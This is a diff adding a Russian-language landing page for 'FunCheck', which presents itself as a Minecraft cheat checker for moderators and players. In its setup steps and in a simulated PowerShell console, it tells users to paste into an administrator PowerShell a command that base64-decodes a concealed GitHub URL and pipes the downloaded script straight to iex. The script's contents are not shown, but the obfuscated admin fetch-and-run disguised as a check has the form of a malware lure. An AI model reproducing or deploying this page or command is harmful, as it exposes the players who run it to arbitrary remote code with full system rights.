@@ -1,0 +1,999 @@
+<!DOCTYPE html>
+<html lang="ru" class="scroll-smooth">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FunCheck — проверка на читы для Minecraft</title>
+<meta name="description" content="FunCheck — инструмент проверки клиентов Minecraft на запрещённое ПО.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%232dd4bf' stroke-width='2.4' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M13 2 3 14h9l-1 8 10-12h-9l1-8z'/%3E%3C/svg%3E">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config = {
+  theme: {
+    extend: {
+      colors: {
+        ink:  { 950:'#0a0508', 900:'#120a0d', 850:'#170e12', 800:'#1e1418', 700:'#2a1c22', 600:'#38252d' },
+        line: '#2a1a20',
+        acc:  '#2dd4bf',
+        vio:  '#8b9dff',
+        dng:  '#ff4d5e',
+        wrn:  '#ffb020',
+        mut:  '#9a8d93',
+        dim:  '#6b5a61'
+      },
+      fontFamily: {
+        sans: ['Manrope','ui-sans-serif','sans-serif'],
+        mono: ['"JetBrains Mono"','ui-monospace','monospace']
+      }
+    }
+  }
+}
+</script>
+<script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
+
+<style>
+  ::selection{ background:rgba(45,212,191,.3); color:#fff; }
+  body{ background:#0a0508; color:#f2e9ec; }
+
+  .bg-grid{
+    background-image:
+      linear-gradient(rgba(255,255,255,.035) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,.035) 1px, transparent 1px);
+    background-size:44px 44px;
+    -webkit-mask-image:radial-gradient(ellipse 90% 75% at 50% 0%, #000 25%, transparent 78%);
+            mask-image:radial-gradient(ellipse 90% 75% at 50% 0%, #000 25%, transparent 78%);
+  }
+
+  #siteHeader.scrolled{
+    background:rgba(10,5,8,.85);
+    backdrop-filter:blur(14px);
+    border-bottom:1px solid #2a1a20;
+  }
+  .nav-link{ position:relative; color:#9a8d93; transition:color .2s; }
+  .nav-link:hover{ color:#ffffff; }
+  .nav-link.active{ color:#ffffff; }
+
+  [data-reveal]{
+    opacity:0; transform:translateY(26px);
+    transition:opacity .8s cubic-bezier(.22,1,.36,1), transform .8s cubic-bezier(.22,1,.36,1);
+    transition-delay:var(--d,0ms);
+  }
+  [data-reveal].in{ opacity:1; transform:none; }
+  @media (prefers-reduced-motion: reduce){
+    [data-reveal]{ transition:none; opacity:1; transform:none; }
+  }
+
+  .term-body::-webkit-scrollbar{ width:8px; }
+  .term-body::-webkit-scrollbar-thumb{ background:rgba(255,255,255,.25); border-radius:4px; }
+  .term-body::-webkit-scrollbar-track{ background:transparent; }
+
+  .tline{ line-height:1.9; white-space:pre-wrap; overflow-wrap:anywhere; }
+  .t-cmd{ color:#f2e9ec; }
+  .t-info{ color:#9a8d93; }
+  .t-dim{ color:#6b5a61; }
+  .t-sec{ color:rgba(139,157,255,.75); font-size:11px; letter-spacing:.1em; margin:12px 0 2px; }
+
+  .t-item{ display:flex; align-items:center; gap:10px; padding:1px 8px; margin:0 -8px; border-radius:6px; }
+  .t-name{ color:#f2e9ec; font-weight:500; flex-shrink:0; }
+  .t-pid{ color:#6b5a61; font-size:11px; flex-shrink:0; }
+  .t-note{ color:#8a7c82; font-size:11px; overflow:hidden; text-overflow:ellipsis; }
+  @media (max-width:480px){ .t-note{ display:none; } }
+
+  .badge{ margin-left:auto; padding:1px 8px; border-radius:5px; font-size:9.5px; font-weight:700;
+          letter-spacing:.08em; flex-shrink:0; }
+  .badge.ok  { color:#f2e9ec; background:rgba(255,255,255,.06); border:1px solid rgba(255,255,255,.2); }
+  .badge.warn{ color:#ffb020; background:rgba(255,176,32,.07); border:1px solid rgba(255,176,32,.25); }
+  .badge.det { color:#ff4d5e; background:rgba(255,45,64,.1); border:1px solid rgba(255,45,64,.35); }
+
+  .t-item.det{ animation:dflash 1.2s ease-out; }
+  .t-item.det  .t-name{ color:#ff8090; }
+  .t-item.warn .t-name{ color:#ffc76b; }
+  @keyframes dflash{ 0%{ background:rgba(255,45,64,.25); } 100%{ background:transparent; } }
+
+  .verdict{ display:flex; align-items:center; gap:10px; border:1px solid; border-radius:10px;
+            padding:9px 14px; margin:12px 0 4px; font-weight:700; font-size:12px;
+            font-family:'JetBrains Mono',monospace; white-space:normal; }
+  .verdict svg{ width:16px; height:16px; flex-shrink:0; }
+  .verdict.flag { color:#ff4d5e; border-color:rgba(255,45,64,.4);  background:rgba(255,45,64,.08); }
+  .verdict.clean{ color:#ffffff; border-color:rgba(255,255,255,.35); background:rgba(255,255,255,.05); }
+  .v-sub{ display:block; font-size:10.5px; font-weight:500; letter-spacing:.02em; margin-top:3px; opacity:.9; }
+
+  .t-scan{ color:rgba(223,233,247,.72); }
+  .t-scan .pct{ color:#2dd4bf; font-weight:700; }
+  .t-result{ margin-top:10px; font-weight:700; letter-spacing:.05em; }
+  .res-ok{ color:#2dd4bf; }
+  .tcur{ display:inline-block; width:8px; height:14px; margin-left:6px; background:#ffffff;
+         vertical-align:-2px; animation:blink 1.1s steps(2,start) infinite; }
+  @keyframes blink{ to{ visibility:hidden; } }
+
+  .sdot{ width:8px; height:8px; border-radius:50%; display:inline-block; flex-shrink:0; }
+  .sdot.idle{ background:rgba(255,255,255,.3); }
+  .sdot.running{ background:#2dd4bf; animation:pulse 1.3s infinite; }
+  .sdot.clean{ background:#ffffff; }
+  .sdot.flag{ background:#ff4d5e; }
+  @keyframes pulse{ 0%,100%{ box-shadow:0 0 0 0 rgba(45,212,191,.45); } 70%{ box-shadow:0 0 0 6px rgba(45,212,191,0); } }
+
+  #termRestart.scanning svg{ animation:spin 1s linear infinite; }
+  #termRestart:disabled{ opacity:.4; cursor:wait; }
+  @keyframes spin{ to{ transform:rotate(360deg); } }
+
+  .chip{
+    font-family:'JetBrains Mono',monospace; font-size:11px;
+    padding:5px 11px; border-radius:7px;
+    border:1px solid #2a1a20; background:#170e12; color:#9a8d93;
+    transition:color .2s, border-color .2s;
+  }
+  .chip:hover{ color:#f2e9ec; border-color:#38252d; }
+
+  .code-pill{
+    display:inline-flex; align-items:center; gap:8px; flex-wrap:wrap;
+    font-family:'JetBrains Mono',monospace; font-size:12px;
+    padding:9px 14px; border-radius:10px;
+    border:1px solid #2a1a20; background:#120a0d; color:#9a8d93;
+  }
+  .code-pill .k{ color:#2dd4bf; }
+  .code-pill.good{ color:#ffffff; border-color:rgba(45,212,191,.4); background:rgba(45,212,191,.07); }
+  .code-pill.good .k{ color:#2dd4bf; }
+  .code-pill.bad{ color:#ff8090; border-color:rgba(255,45,64,.4); background:rgba(255,45,64,.07); }
+  .code-pill.bad .k{ color:#ff4d5e; }
+
+  .acc-item{ border:1px solid #2a1a20; border-radius:14px; background:#120a0d;
+             transition:border-color .3s, background .3s; }
+  .acc-item:hover{ border-color:#38252d; }
+  .acc-item.open{ border-color:rgba(45,212,191,.4); background:#170e12; }
+  .acc-icon{ transition:transform .35s cubic-bezier(.22,1,.36,1), color .3s; color:#6b5a61; }
+  .acc-item.open .acc-icon{ transform:rotate(180deg); color:#2dd4bf; }
+  .acc-body{ display:grid; grid-template-rows:0fr; transition:grid-template-rows .45s cubic-bezier(.22,1,.36,1); }
+  .acc-item.open .acc-body{ grid-template-rows:1fr; }
+  .acc-body > div{ overflow:hidden; }
+
+  #toast{ transition:opacity .3s, transform .3s; }
+  #toast.show{ opacity:1; transform:translate(-50%,0); }
+</style>
+</head>
+
+<body id="top" class="font-sans antialiased overflow-x-hidden">
+
+<!-- ═══════════════ ХЕДЕР ═══════════════ -->
+<header id="siteHeader" class="fixed top-0 inset-x-0 z-50 transition-all duration-300">
+  <div class="max-w-6xl mx-auto px-5 sm:px-6">
+    <div class="flex items-center h-16 gap-8">
+      <a href="#top" class="flex items-center gap-2.5 shrink-0">
+        <span class="w-9 h-9 rounded-lg bg-acc/10 border border-acc/30 flex items-center justify-center text-acc">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" class="w-[18px] h-[18px]">
+            <path d="M13 2 3 14h9l-1 8 10-12h-9l1-8z"/>
+          </svg>
+        </span>
+        <span class="font-extrabold tracking-tight text-lg">Fun<span class="text-acc">Check</span></span>
+      </a>
+
+      <nav class="hidden md:flex items-center gap-7 text-sm font-medium">
+        <a href="#top"      class="nav-link">Главная</a>
+        <a href="#how"      class="nav-link">Как работает</a>
+        <a href="#features" class="nav-link">Возможности</a>
+        <a href="#download" class="nav-link">Команда</a>
+        <a href="#faq"      class="nav-link">FAQ</a>
+      </nav>
+
+      <div class="ml-auto flex items-center gap-3">
+        <button onclick="startCheck()"
+                class="hidden sm:inline-flex items-center gap-2 bg-acc text-white font-bold text-sm px-4 py-2 rounded-lg
+                       hover:bg-[#4fe3cc] active:scale-[.97] transition shadow-[0_4px_20px_rgba(45,212,191,.25)]">
+          <i data-lucide="play" class="w-4 h-4"></i>
+          Начать проверку
+        </button>
+        <button id="burger" class="md:hidden w-10 h-10 rounded-lg border border-line bg-ink-900 flex items-center justify-center text-mut">
+          <i data-lucide="menu" class="w-5 h-5"></i>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <div id="mobileMenu" class="hidden md:hidden border-b border-line bg-ink-950/95 backdrop-blur-xl">
+    <nav class="px-5 py-4 flex flex-col gap-1 text-[15px] font-medium">
+      <a href="#top"      class="mob-link py-2.5 text-mut hover:text-white transition">Главная</a>
+      <a href="#how"      class="mob-link py-2.5 text-mut hover:text-white transition">Как работает</a>
+      <a href="#features" class="mob-link py-2.5 text-mut hover:text-white transition">Возможности</a>
+      <a href="#download" class="mob-link py-2.5 text-mut hover:text-white transition">Команда</a>
+      <a href="#faq"      class="mob-link py-2.5 text-mut hover:text-white transition">FAQ</a>
+      <button onclick="startCheck()" class="mob-link mt-2 inline-flex items-center justify-center gap-2 bg-acc text-white font-bold px-4 py-3 rounded-lg">
+        <i data-lucide="play" class="w-4 h-4"></i> Начать проверку
+      </button>
+    </nav>
+  </div>
+</header>
+
+<main>
+<!-- ═══════════════ HERO ═══════════════ -->
+<section class="relative pt-32 pb-0 md:pt-40">
+  <div class="bg-grid absolute inset-0 pointer-events-none"></div>
+  <div class="absolute -top-40 left-1/4 w-[600px] h-[400px] rounded-full bg-acc/[0.05] blur-[120px] pointer-events-none"></div>
+
+  <div class="relative max-w-6xl mx-auto px-5 sm:px-6">
+
+    <div data-reveal>
+      <div class="inline-flex items-center gap-2.5 rounded-full border border-line bg-ink-900/80 px-4 py-1.5 mb-7">
+        <span class="w-2 h-2 rounded-full bg-acc animate-pulse"></span>
+        <span class="font-mono text-[11px] tracking-[.14em] text-mut uppercase">Инструмент модерации · FunTime</span>
+      </div>
+
+      <h1 class="text-5xl md:text-7xl font-extrabold tracking-tight leading-[1.02]">
+        Fun <span class="text-acc">Check</span>
+      </h1>
+
+      <p class="mt-5 text-xl md:text-2xl font-bold text-white leading-snug">
+        Проверка на читы одной командой в PowerShell
+      </p>
+      <p class="mt-4 text-mut leading-relaxed max-w-md">
+        Скрипт сканирует систему, показывает все запуски и инжекты в Minecraft и выдаёт вердикт прямо в выводе:
+        <span class="text-acc font-semibold">NO CHEAT DETECTED</span> либо
+        <span class="text-dng font-semibold">CHEAT DETECTED</span> с названием найденного инжекта.
+      </p>
+
+      <div class="mt-8 flex flex-wrap gap-3.5">
+        <a href="#download"
+           class="inline-flex items-center gap-2.5 bg-acc text-white font-bold px-6 py-3.5 rounded-xl
+                  hover:bg-[#4fe3cc] active:scale-[.97] transition shadow-[0_6px_28px_rgba(45,212,191,.28)]">
+          <i data-lucide="terminal" class="w-[18px] h-[18px]"></i>
+          Команда запуска
+        </a>
+        <a href="#how"
+           class="inline-flex items-center gap-2.5 border border-line bg-ink-900 text-white font-semibold px-6 py-3.5 rounded-xl
+                  hover:border-ink-600 hover:bg-ink-850 active:scale-[.97] transition">
+          <i data-lucide="play" class="w-[18px] h-[18px] text-acc"></i>
+          Как проходит проверка
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ консоль PowerShell на всю ширину экрана ══ -->
+  <div class="relative mt-14 md:mt-16" data-reveal style="--d:150ms">
+    <div class="w-full overflow-hidden border-t border-white/10 shadow-[0_30px_100px_rgba(0,0,0,.75)]">
+      <div class="flex items-center gap-2 px-4 sm:px-6 py-2.5 bg-[#1b1b1b] border-b border-white/10">
+        <span class="w-3 h-3 rounded-full bg-[#e81123]"></span>
+        <span class="w-3 h-3 rounded-full bg-[#f2c811]"></span>
+        <span class="w-3 h-3 rounded-full bg-[#7bd338]"></span>
+        <span class="ml-2 text-[12px] text-white/70 truncate">Windows PowerShell</span>
+        <span class="ml-auto font-mono text-[10.5px] text-white/40 hidden sm:inline">администратор</span>
+        <button id="termRestart" title="Запустить заново"
+                class="ml-3 w-7 h-7 rounded-md border border-white/15 bg-white/5 flex items-center justify-center text-white/60 hover:text-acc hover:border-acc/50 transition">
+          <i data-lucide="rotate-cw" class="w-3.5 h-3.5"></i>
+        </button>
+      </div>
+
+      <div id="termBody" class="term-body h-[300px] sm:h-[360px] overflow-y-auto px-5 sm:px-10 py-7 font-mono text-[13.5px] sm:text-[15px] leading-[1.9] bg-[#012456] text-[#dfe9f7]"></div>
+
+      <div class="flex items-center gap-2.5 px-5 sm:px-10 py-2.5 bg-[#012456] border-t border-white/10">
+        <span id="termDot" class="sdot idle"></span>
+        <span id="termStatus" class="font-mono text-[11px] text-white/60 truncate">Готово к вводу команды…</span>
+        <span class="ml-auto font-mono text-[10px] text-white/35 hidden sm:inline">FunCheck · PowerShell</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════ КАК РАБОТАЕТ ═══════════════ -->
+<section id="how" class="py-24 md:py-28 border-t border-line scroll-mt-20">
+  <div class="max-w-6xl mx-auto px-5 sm:px-6">
+    <div class="mb-14 md:mb-16" data-reveal>
+      <div class="font-mono text-xs text-acc tracking-[.12em] mb-3">// 01 · КАК РАБОТАЕТ</div>
+      <h2 class="text-3xl md:text-4xl font-extrabold tracking-tight">Как работает команда</h2>
+      <p class="mt-3 text-mut max-w-xl leading-relaxed">
+        Вставляешь команду в PowerShell — скрипт сканирует систему, показывает запуски и инжекты в Minecraft и выдаёт вердикт прямо в выводе.
+      </p>
+    </div>
+
+    <div class="relative max-w-3xl mx-auto">
+      <div class="absolute left-7 top-3 bottom-3 w-px bg-line" aria-hidden="true"></div>
+
+      <div class="space-y-10 md:space-y-12">
+
+        <div class="relative flex gap-5 sm:gap-7" data-reveal>
+          <div class="shrink-0 w-14 h-14 rounded-xl border border-line bg-ink-900 flex items-center justify-center font-mono font-semibold text-acc relative z-10">01</div>
+          <div class="pt-1.5 min-w-0">
+            <h3 class="text-lg font-bold">Команда в PowerShell от администратора</h3>
+            <p class="mt-2 text-mut text-[15px] leading-relaxed">Модератор выдаёт команду — игрок вставляет её в PowerShell, запущенный от имени администратора. Ничего устанавливать не нужно.</p>
+            <div class="code-pill mt-4 w-full"><span class="k shrink-0">PS C:\Windows\system32&gt;</span><span class="break-all">iwr -UseBasicParsing ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Z1bmRydWczNS1qcGcvYXNkdmNhc2QvbWFpbi9ydW4ucHMx'))) | iex</span></div>
+          </div>
+        </div>
+
+        <div class="relative flex gap-5 sm:gap-7" data-reveal style="--d:80ms">
+          <div class="shrink-0 w-14 h-14 rounded-xl border border-line bg-ink-900 flex items-center justify-center font-mono font-semibold text-acc relative z-10">02</div>
+          <div class="pt-1.5 min-w-0">
+            <h3 class="text-lg font-bold">Сканирование системы</h3>
+            <p class="mt-2 text-mut text-[15px] leading-relaxed">Скрипт собирает всё, что запущено на компьютере: процессы, загруженные DLL, файлы игры и артефакты Windows — около трёх тысяч объектов.</p>
+            <div class="code-pill mt-4"><span class="k">scope:</span> процессы · DLL · .minecraft · prefetch</div>
+          </div>
+        </div>
+
+        <div class="relative flex gap-5 sm:gap-7" data-reveal style="--d:160ms">
+          <div class="shrink-0 w-14 h-14 rounded-xl border border-line bg-ink-900 flex items-center justify-center font-mono font-semibold text-acc relative z-10">03</div>
+          <div class="pt-1.5 min-w-0">
+            <h3 class="text-lg font-bold">Запуски и инжекты в Minecraft</h3>
+            <p class="mt-2 text-mut text-[15px] leading-relaxed">Отдельно разбирается сама игра: что именно запускалось и какие библиотеки внедрены в процесс javaw.exe — именно так виден инжект.</p>
+            <div class="code-pill mt-4"><span class="k">inject:</span> javaw.exe · LoadLibrary · модули</div>
+          </div>
+        </div>
+
+        <div class="relative flex gap-5 sm:gap-7" data-reveal style="--d:240ms">
+          <div class="shrink-0 w-14 h-14 rounded-xl border border-line bg-ink-900 flex items-center justify-center font-mono font-semibold text-acc relative z-10">04</div>
+          <div class="pt-1.5 min-w-0">
+            <h3 class="text-lg font-bold">Вердикт</h3>
+            <p class="mt-2 text-mut text-[15px] leading-relaxed">Чисто — в выводе появляется зелёное <b class="text-acc">NO CHEAT DETECTED</b>. Есть чит — красное <b class="text-dng">CHEAT DETECTED</b> и название найденного инжекта.</p>
+            <div class="mt-4 flex flex-wrap gap-2">
+              <span class="code-pill good">NO CHEAT DETECTED</span>
+              <span class="code-pill bad"><span class="k">CHEAT DETECTED</span> · inject_helper.dll</span>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════ ВОЗМОЖНОСТИ ═══════════════ -->
+<section id="features" class="py-24 md:py-28 border-t border-line bg-ink-900/40 scroll-mt-20">
+  <div class="max-w-6xl mx-auto px-5 sm:px-6">
+    <div class="mb-14 md:mb-16" data-reveal>
+      <div class="font-mono text-xs text-acc tracking-[.12em] mb-3">// 02 · ВОЗМОЖНОСТИ</div>
+      <h2 class="text-3xl md:text-4xl font-extrabold tracking-tight">Что видит чекер</h2>
+      <p class="mt-3 text-mut max-w-xl leading-relaxed">
+        Шесть уровней проверки — от запущенных процессов до следов, которые чит оставляет в Windows, — плюс инструменты для ручного разбора системы.
+      </p>
+    </div>
+
+    <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-5">
+
+      <div class="lg:col-span-2 rounded-2xl border border-line bg-ink-900 p-7 hover:border-acc/40 transition-colors" data-reveal>
+        <div class="flex items-start justify-between gap-4">
+          <div class="w-11 h-11 rounded-xl bg-acc/10 border border-acc/30 flex items-center justify-center text-acc shrink-0">
+            <i data-lucide="shield-alert" class="w-5 h-5"></i>
+          </div>
+          <span class="font-mono text-[11px] text-vio border border-vio/25 bg-vio/5 rounded-md px-2.5 py-1 whitespace-nowrap">база от 28.10.2025</span>
+        </div>
+        <h3 class="mt-5 text-lg font-bold">Обнаружение известных чит-клиентов</h3>
+        <p class="mt-2 text-mut text-[15px] leading-relaxed max-w-lg">
+          142 сигнатуры клиентов, инжекторов и библиотек. База обновляется каждую неделю — новые сборки попадают в детект в течение 24 часов.
+        </p>
+        <div class="mt-6 flex flex-wrap gap-2">
+          <span class="chip">Vape V4</span><span class="chip">Rise</span><span class="chip">Velocity</span>
+          <span class="chip">Flask</span><span class="chip">LiquidBounce</span><span class="chip">Sigma</span>
+          <span class="chip">Novel</span><span class="chip">FDP</span><span class="chip">Drip</span>
+          <span class="chip !text-white !border-white/30 !bg-white/5">и ещё 132</span>
+        </div>
+      </div>
+
+      <div class="rounded-2xl border border-line bg-ink-900 p-7 hover:border-ink-600 transition-colors" data-reveal style="--d:60ms">
+        <div class="w-11 h-11 rounded-xl bg-ink-800 border border-line flex items-center justify-center text-white">
+          <i data-lucide="scan-line" class="w-5 h-5"></i>
+        </div>
+        <h3 class="mt-5 text-lg font-bold">Сканирование процессов и DLL</h3>
+        <p class="mt-2 text-mut text-[15px] leading-relaxed">Все запущенные процессы и модули игры сверяются с эталонными подписями и хеш-суммами.</p>
+        <div class="mt-4 font-mono text-[11px] text-dim space-y-1">
+          <div>javaw.exe · сверка <span class="text-white">OK</span></div>
+          <div>lwjgl.dll · SHA-256 <span class="text-white">OK</span></div>
+        </div>
+      </div>
+
+      <div class="rounded-2xl border border-line bg-ink-900 p-7 hover:border-ink-600 transition-colors" data-reveal>
+        <div class="w-11 h-11 rounded-xl bg-ink-800 border border-line flex items-center justify-center text-white">
+          <i data-lucide="folder-search" class="w-5 h-5"></i>
+        </div>
+        <h3 class="mt-5 text-lg font-bold">Проверка .minecraft и mods</h3>
+        <p class="mt-2 text-mut text-[15px] leading-relaxed">Целостность клиента, версия Forge, список модификаций и конфигов. Запрещённые моды видно сразу.</p>
+        <div class="mt-4 flex flex-wrap gap-1.5">
+          <span class="chip !py-1 !px-2 !text-[10px]">/mods</span>
+          <span class="chip !py-1 !px-2 !text-[10px]">/versions</span>
+          <span class="chip !py-1 !px-2 !text-[10px]">/config</span>
+        </div>
+      </div>
+
+      <div class="rounded-2xl border border-line bg-ink-900 p-7 hover:border-ink-600 transition-colors" data-reveal style="--d:60ms">
+        <div class="w-11 h-11 rounded-xl bg-ink-800 border border-line flex items-center justify-center text-white">
+          <i data-lucide="history" class="w-5 h-5"></i>
+        </div>
+        <h3 class="mt-5 text-lg font-bold">Prefetch и Recent files</h3>
+        <p class="mt-2 text-mut text-[15px] leading-relaxed">Следы запуска ПО на уровне Windows: чит виден, даже если его удалили прямо перед проверкой.</p>
+      </div>
+
+      <div class="rounded-2xl border border-line bg-ink-900 p-7 hover:border-acc/40 transition-colors" data-reveal style="--d:120ms">
+        <div class="w-11 h-11 rounded-xl bg-acc/10 border border-acc/30 flex items-center justify-center text-acc">
+          <i data-lucide="eye-off" class="w-5 h-5"></i>
+        </div>
+        <h3 class="mt-5 text-lg font-bold">Анти-обход</h3>
+        <p class="mt-2 text-mut text-[15px] leading-relaxed">Детект скрытия процессов, спуфа имён, заморозки окон и прокидывания через VM. Попытка обмана — автоматический флаг.</p>
+      </div>
+
+      <div class="rounded-2xl border border-line bg-ink-900 p-7 hover:border-ink-600 transition-colors" data-reveal style="--d:180ms">
+        <div class="w-11 h-11 rounded-xl bg-ink-800 border border-line flex items-center justify-center text-white">
+          <i data-lucide="file-check-2" class="w-5 h-5"></i>
+        </div>
+        <h3 class="mt-5 text-lg font-bold">Готовый вердикт без споров</h3>
+        <p class="mt-2 text-mut text-[15px] leading-relaxed">В выводе — NO CHEAT DETECTED либо CHEAT DETECTED с названием найденного инжекта. Достаточно, чтобы закрыть вопрос без лишних споров.</p>
+      </div>
+
+    </div>
+
+    <div class="mt-6 rounded-2xl border border-line bg-ink-900 p-7" data-reveal>
+      <div class="flex items-start gap-4">
+        <span class="w-11 h-11 rounded-xl bg-acc/10 border border-acc/30 flex items-center justify-center text-acc shrink-0">
+          <i data-lucide="wrench" class="w-5 h-5"></i>
+        </span>
+        <div>
+          <h3 class="text-lg font-bold">Инструменты разбора системы</h3>
+          <p class="mt-1 text-mut text-[14px] leading-relaxed">Программы, которыми модератор пользуется наряду с командой, когда нужно разобрать систему вручную.</p>
+        </div>
+      </div>
+
+      <div class="mt-6 grid md:grid-cols-2 gap-x-9 gap-y-6">
+
+        <div class="flex gap-3.5">
+          <span class="mt-[7px] w-1.5 h-1.5 rounded-full bg-acc shrink-0"></span>
+          <div class="min-w-0">
+            <div class="flex items-center gap-2 flex-wrap">
+              <a href="https://www.voidtools.com/downloads/" target="_blank" rel="noopener" title="Скачать Everything"
+                 class="font-mono text-[13.5px] font-bold text-white hover:text-acc underline decoration-acc/30 decoration-dotted underline-offset-4 transition-colors">Everything</a>
+              <span class="chip !py-0.5 !px-2 !text-[10px]">поиск файлов</span>
+            </div>
+            <p class="mt-1.5 text-mut text-[14px] leading-relaxed">Мгновенный поиск по папкам, названиям или весу файлов — находит нужное за секунды.</p>
+          </div>
+        </div>
+
+        <div class="flex gap-3.5">
+          <span class="mt-[7px] w-1.5 h-1.5 rounded-full bg-acc shrink-0"></span>
+          <div class="min-w-0">
+            <div class="flex items-center gap-2 flex-wrap">
+              <a href="https://journaltrace.com/" target="_blank" rel="noopener" title="Скачать JournalTrace"
+                 class="font-mono text-[13.5px] font-bold text-white hover:text-acc underline decoration-acc/30 decoration-dotted underline-offset-4 transition-colors">JournalTrace</a>
+              <span class="chip !py-0.5 !px-2 !text-[10px]">журнал файлов</span>
+            </div>
+            <p class="mt-1.5 text-mut text-[14px] leading-relaxed">Показывает действия, которые пользователь совершал с файлами и папками.</p>
+          </div>
+        </div>
+
+        <div class="flex gap-3.5">
+          <span class="mt-[7px] w-1.5 h-1.5 rounded-full bg-acc shrink-0"></span>
+          <div class="min-w-0">
+            <div class="flex items-center gap-2 flex-wrap">
+              <a href="https://privazer.com/en/download-shellbag-analyzer-shellbag-cleaner.php" target="_blank" rel="noopener" title="Скачать ShellBags Analyzer &amp; Cleaner"
+                 class="font-mono text-[13.5px] font-bold text-white hover:text-acc underline decoration-acc/30 decoration-dotted underline-offset-4 transition-colors">ShellBags Analyzer &amp; Cleaner</a>
+              <span class="chip !py-0.5 !px-2 !text-[10px]">история папок</span>
+            </div>
+            <p class="mt-1.5 text-mut text-[14px] leading-relaxed">Позволяет узнать, какие папки посещались, удалялись и что с ними делали.</p>
+          </div>
+        </div>
+
+        <div class="flex gap-3.5">
+          <span class="mt-[7px] w-1.5 h-1.5 rounded-full bg-acc shrink-0"></span>
+          <div class="min-w-0">
+            <div class="flex items-center gap-2 flex-wrap">
+              <a href="https://processhacker.sourceforge.io/downloads.php" target="_blank" rel="noopener" title="Скачать Process Hacker 2"
+                 class="font-mono text-[13.5px] font-bold text-white hover:text-acc underline decoration-acc/30 decoration-dotted underline-offset-4 transition-colors">Process Hacker 2</a>
+              <span class="chip !py-0.5 !px-2 !text-[10px]">память и процессы</span>
+            </div>
+            <p class="mt-1.5 text-mut text-[14px] leading-relaxed">Залезает в память устройства и свойства процессов — ищет спрятанные читы.</p>
+          </div>
+        </div>
+
+        <div class="flex gap-3.5 md:col-span-2">
+          <span class="mt-[7px] w-1.5 h-1.5 rounded-full bg-acc shrink-0"></span>
+          <div class="min-w-0">
+            <div class="flex items-center gap-2 flex-wrap">
+              <a href="https://systeminformer.sourceforge.io/downloads" target="_blank" rel="noopener" title="Скачать SystemInformer"
+                 class="font-mono text-[13.5px] font-bold text-white hover:text-acc underline decoration-acc/30 decoration-dotted underline-offset-4 transition-colors">SystemInformer</a>
+              <span class="chip !py-0.5 !px-2 !text-[10px]">память и процессы</span>
+            </div>
+            <p class="mt-1.5 text-mut text-[14px] leading-relaxed">Залезает в память устройства и свойства процессов — ищет спрятанные читы, которые не видны обычным средствам.</p>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════ СКАЧИВАНИЕ ═══════════════ -->
+<section id="download" class="relative overflow-hidden py-24 md:py-28 border-t border-line scroll-mt-20">
+  <!-- фон: окно Windows PowerShell на всю ширину, слегка размыто -->
+  <div class="absolute inset-0 flex items-center justify-center pointer-events-none" aria-hidden="true">
+    <div class="w-[1720px] max-w-none shrink-0 select-none opacity-[.45] blur-[1.8px]">
+      <div class="rounded-lg border border-white/10 overflow-hidden shadow-[0_30px_120px_rgba(0,0,0,.85)]">
+        <div class="flex items-center gap-2 px-3 py-2 bg-[#1f1f1f] border-b border-white/10">
+          <span class="w-3 h-3 rounded-full bg-[#e81123]"></span>
+          <span class="w-3 h-3 rounded-full bg-[#f2c811]"></span>
+          <span class="w-3 h-3 rounded-full bg-[#7bd338]"></span>
+          <span class="ml-2 text-[12px] text-white/60">Windows PowerShell</span>
+        </div>
+        <div class="bg-[#012456] px-6 py-7 font-mono text-[13.5px] leading-[1.9] text-[#cfe0f5]">
+          <div>Windows PowerShell 10.0.19045.3803</div>
+          <div>(c) Корпорация Майкрософт (Microsoft Corporation). Все права защищены.</div>
+          <div>&nbsp;</div>
+          <div><span class="text-white">PS C:\Windows\system32&gt;</span> iwr -UseBasicParsing ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Z1bmRydWczNS1qcGcvYXNkdmNhc2QvbWFpbi9ydW4ucHMx'))) | iex</div>
+          <div>[core] инициализация ядра сканирования… OK</div>
+          <div>[core] загрузка сигнатур: 142/142 · база от 28.10.2025</div>
+          <div>&nbsp;</div>
+          <div class="text-white">── ЗАПУСКИ ПРОЦЕССОВ ───────────────────────────</div>
+          <div>javaw.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pid 4821&nbsp;&nbsp; Minecraft 1.16.5 · FunTime&nbsp;&nbsp;&nbsp;&nbsp; OK</div>
+          <div>ft-launcher.exe&nbsp; pid 1190&nbsp;&nbsp; официальный лаунчер&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OK</div>
+          <div>chrome.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pid 3327&nbsp;&nbsp; подписан: Google LLC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OK</div>
